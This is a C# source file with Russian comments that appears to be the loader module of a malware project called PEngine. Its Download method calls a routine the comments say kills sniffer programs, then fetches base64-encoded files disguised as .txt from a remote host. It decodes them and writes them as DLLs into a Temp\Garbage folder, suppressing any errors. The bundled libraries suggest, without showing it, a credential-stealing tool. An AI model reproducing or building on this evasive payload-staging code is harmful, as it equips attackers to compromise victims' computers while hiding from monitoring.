namespace PEngine.Loader
{
    using System;
    using System.Collections.Generic;
    using System.IO;
    using PEngine.Helpers;
    using PEngine.Main;
    using PEngine.Sticks;

    public class SafeDll
    {
        private static readonly string OSDirectory = CombineEx.Combination(GlobalPath.GarbageTemp, OSLibrary.GetOSBit()); 

        private static readonly List<string> Encryptdll = new List<string>()
        {
            "x86/SQLite.Interop.txt",
            "x64/SQLite.Interop.txt",
            "Ionic.Zip.txt",
            "Newtonsoft.Json.txt",
            "System.Data.SQLite.txt"
        };

        private static void GetByte(string Link, string Name)
        {
            try
            {
                File.WriteAllBytes(Name, Convert.FromBase64String(NetControl.GetData(Link))); // Запишим байты в файл с уже расшифрованными данными.
            }
            catch (IOException) { }
            catch (UnauthorizedAccessException) { }
            catch (ArgumentException) { }
        }

        public static bool Download(string HostName)
        {
            AntiSniffer.Inizialize(); // Убиваем снифферы.
            if (Directory.Exists(GlobalPath.GarbageTemp)) // проверяем папку Garbage в папке Temp - Temp\Garbage
            {
                if (!Directory.Exists(OSDirectory)) // Проверяем директорию битности
                {
                    CombineEx.CreateDir(OSDirectory); // Создадим директорию.
                    return Download(HostName); // Снова выполним метод Download
                }
                else // Если папка битности есть то..
                {
                    foreach (string list in Encryptdll) // проходим циклом по списку Encryptdll
                    {
                        if (!list.EndsWith(".txt", StringComparison.Ordinal)) // Проверим что список состоит из .txt файлов
                        {
                            return false; // если нет то завершаем работу.
                        }
                        else
                        {
                            string ChangerExtension = Path.ChangeExtension(list, ".dll"); // Переименовываем форматы файлов в *.dll
                            GetByte($@"{HostName}/files/dll/{list}", CombineEx.Combination(GlobalPath.GarbageTemp, ChangerExtension)); // Скачиваем .dll файлы
                        }
                    }
                }
            }
            return true; // Переходим дальше.
        }
    }
}